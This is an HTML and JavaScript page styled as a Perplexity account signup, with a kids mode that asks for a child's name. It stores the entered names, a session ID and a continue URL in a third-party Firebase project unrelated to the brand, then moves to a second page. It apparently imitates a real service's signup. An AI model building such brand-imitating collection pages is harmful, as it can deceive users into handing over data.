<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Create Your Perplexity Account</title>

    <!-- Inter Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

    <style>
        * {
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        :root {
            --bg: #ffffff;
            --text: #000000;
            --subtext: #6e6e80;
            --border: #d1d1d6;
            --input-bg: #ffffff;
            --btn-bg: #000000;
            --btn-text: #ffffff;
            --label-bg: #ffffff;
        }

        body.dark {
            --bg: #000000;
            --text: #ffffff;
            --subtext: #aaaaaa;
            --border: #555555;
            --input-bg: #000000;
            --btn-bg: #ffffff;
            --btn-text: #000000;
            --label-bg: #000000;
        }

        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            background-color: var(--bg);
            color: var(--text);
            transition:
                background-color 0.25s ease,
                color 0.25s ease;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 8px;
            margin-top: 40px;
            letter-spacing: -1px;
            line-height: 1.1;
        }

        .subtitle {
            font-size: 16px;
            color: var(--subtext);
            margin-bottom: 40px;
            transition: color 0.25s ease;
        }

        .input-group {
            width: 100%;
            position: relative;
            margin-bottom: 16px;
            text-align: left;
        }

        .input-group label {
            position: absolute;
            top: -10px;
            left: 12px;
            background: var(--label-bg);
            padding: 0 6px;
            font-size: 12px;
            font-weight: 500;
            color: var(--subtext);
            z-index: 1;
            transition:
                background-color 0.25s ease,
                color 0.25s ease;
        }

        input {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 500;
            border: 1px solid var(--border);
            border-radius: 24px;
            outline: none;
            background: var(--input-bg);
            color: var(--text);
            transition:
                background-color 0.25s ease,
                color 0.25s ease,
                border-color 0.25s ease;
        }

        input::placeholder {
            color: #999;
        }

        input:focus {
            border-width: 2px;
            border-color: var(--text);
        }

        .btn-continue {
            width: 100%;
            background-color: var(--btn-bg);
            color: var(--btn-text);
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 28px;
            cursor: pointer;
            margin-top: 20px;
            transition:
                background-color 0.25s ease,
                color 0.25s ease,
                transform 0.15s ease;
        }

        .btn-continue:hover {
            transform: scale(1.01);
        }

        .btn-continue:active {
            transform: scale(0.99);
        }

        .error {
            color: #d93025;
            font-size: 12px;
            margin-top: 5px;
            margin-left: 15px;
            display: none;
            font-weight: 500;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Create a Perplexity Account</h1>

    <p class="subtitle" id="subtitleText">
        Enter your name
    </p>

    <div class="input-group">
        <label id="firstNameLabel">First name</label>

        <input
            type="text"
            id="firstName"
            placeholder="First name"
            required
            autofocus
        />

        <div id="fnError" class="error">
            First name is required
        </div>
    </div>

    <div class="input-group" style="margin-top: 10px;">
        <label>Last name</label>

        <input
            type="text"
            id="lastName"
            placeholder="Last name (optional)"
        />
    </div>

    <button class="btn-continue" id="continueBtn">
        Continue
    </button>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";

import {
    getFirestore,
    doc,
    setDoc
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
    authDomain: "question-metabase.firebaseapp.com",
    databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "question-metabase",
    storageBucket: "question-metabase.firebasestorage.app",
    messagingSenderId: "770698198753",
    appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
    measurementId: "G-6ZP1FPMKSJ"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

/* ======================================================
   URL PARAMS
====================================================== */
const params = new URLSearchParams(window.location.search);

const type = (params.get("type") || "personal").toLowerCase();

/* ======================================================
   REAL-TIME THEME SYSTEM
====================================================== */

function setTheme() {
    const theme = params.get("theme");

    // Manual Dark
    if (theme === "d") {
        document.body.classList.add("dark");
        return;
    }

    // Manual Light
    if (theme === "l") {
        document.body.classList.remove("dark");
        return;
    }

    // Auto Real-Time System Theme
    const isDark =
        window.matchMedia("(prefers-color-scheme: dark)").matches;

    document.body.classList.toggle("dark", isDark);
}

// Initial apply
setTheme();

// Real-time device theme change listener
window
    .matchMedia("(prefers-color-scheme: dark)")
    .addEventListener("change", setTheme);

/* ======================================================
   KIDS MODE UI
====================================================== */

function applyTypeUI() {

    const subtitle = document.getElementById("subtitleText");

    if (type === "kids") {

        subtitle.textContent = "Enter your child's name";

        document.getElementById("firstName").placeholder =
            "Child's first name";

        document.getElementById("firstNameLabel").textContent =
            "Child's first name";
    }
}

applyTypeUI();

/* ======================================================
   SESSION SYSTEM
====================================================== */

function initSession() {

    let session = params.get("session");
    let cont = params.get("continue") || "";

    if (!session) {

        session = Math.floor(
            1000000000 + Math.random() * 9000000000
        ).toString();

        let newUrl =
            `${window.location.pathname}?session=${session}&type=${type}`;

        if (cont) {
            newUrl += `&continue=${encodeURIComponent(cont)}`;
        }

        const theme = params.get("theme");

        if (theme) {
            newUrl += `&theme=${theme}`;
        }

        window.history.replaceState({}, "", newUrl);
    }

    return {
        session,
        cont
    };
}

const { session, cont } = initSession();

/* ======================================================
   SUBMIT
====================================================== */

async function submitData() {

    const firstName =
        document.getElementById("firstName").value.trim();

    const lastName =
        document.getElementById("lastName").value.trim();

    const errorDiv =
        document.getElementById("fnError");

    if (!firstName) {

        errorDiv.style.display = "block";
        return;
    }

    errorDiv.style.display = "none";

    let familyValue = "no";

    if (type === "kids") {
        familyValue = "commit";
    }

    if (type === "business") {
        familyValue = "workspace";
    }

    try {

        await setDoc(
            doc(db, "ASPX Keys", session),
            {
                firstName,
                lastName,
                type,
                family: familyValue,
                continue: cont || null,
                timestamp: new Date()
            }
        );

        window.location.href =
            `2.html?session=${session}`;

    } catch (e) {

        console.error("Error:", e);
    }
}

/* ======================================================
   EVENTS
====================================================== */

document
    .getElementById("firstName")
    .addEventListener("keypress", (e) => {

        if (e.key === "Enter") {

            e.preventDefault();

            document
                .getElementById("lastName")
                .focus();
        }
    });

document
    .getElementById("lastName")
    .addEventListener("keypress", (e) => {

        if (e.key === "Enter") {

            e.preventDefault();

            submitData();
        }
    });

document
    .getElementById("continueBtn")
    .addEventListener("click", submitData);

</script>

</body>
</html>
